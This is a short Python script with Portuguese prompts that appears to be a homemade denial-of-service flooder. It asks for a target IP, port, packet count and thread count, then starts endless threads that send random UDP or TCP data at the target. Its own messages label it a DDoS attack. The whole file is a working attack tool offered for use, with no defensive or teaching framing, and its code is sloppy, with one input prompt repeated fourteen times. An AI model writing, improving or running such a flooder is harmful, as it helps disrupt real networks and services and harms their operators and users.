import sys
import os
import time
import random
import socket
import threading
#Codigo do Tempoo
from datetime import datetime
now = datetime.now()
hour = now.hour
minute = now.minute
day = now.day
month = now.month
year = now.year

os.system("Script Installed com sucesso")
print("")
print(" ===BY ADRIAN SCRIPT INOVADOR! ")
print("*****************************")
print("SCRIPT INICIADO COM SUCESSO*")
ip = str(input(" COLQUE O IP AQUI!:"))
port = int(input(" COLQUE A PORTA AQUI!:"))
print("")
choice = str(input("POTENCIA(y/n):"))
ddos = str(input(" POTENCIA2(y/n):"))
print("")
times = int(input(" NUMEROS DE PACOTE!:"))
times = int(input(" NUMEROS DE PACOTE!:"))
times = int(input(" NUMEROS DE PACOTE!:"))
times = int(input(" NUMEROS DE PACOTE!:"))
times = int(input(" NUMEROS DE PACOTE!:"))
times = int(input(" NUMEROS DE PACOTE!:"))
times = int(input(" NUMEROS DE PACOTE!:"))
times = int(input(" NUMEROS DE PACOTE!:"))
times = int(input(" NUMEROS DE PACOTE!:"))
times = int(input(" NUMEROS DE PACOTE!:"))
times = int(input(" NUMEROS DE PACOTE!:"))
times = int(input(" NUMEROS DE PACOTE!:"))
times = int(input(" NUMEROS DE PACOTE!:"))
times = int(input(" NUMEROS DE PACOTE!:"))
threads = int(input(" NUMERO DE PACOTE2:"))
def run():
	data = random._urandom(1024)
	i = random.choice(("[*]","[!]","[#]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			print(" SEND*******")
			print("")
		except:
			print("DDoS/Packet ERROR")
			print("The attack failed")

def run2():
	data = random._urandom(16)
	i = random.choice(("[*]","[!]","[#]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(" SEND*******")
			print("")
		except:
			s.close()
			print("Send:Error")
			print("Send:Error")

for y in range(threads):
	if choice == 'y':
		th = threading.Thread(target = run)
		th.start()
	else:
		th = threading.Thread(target = run2)
		th.start()
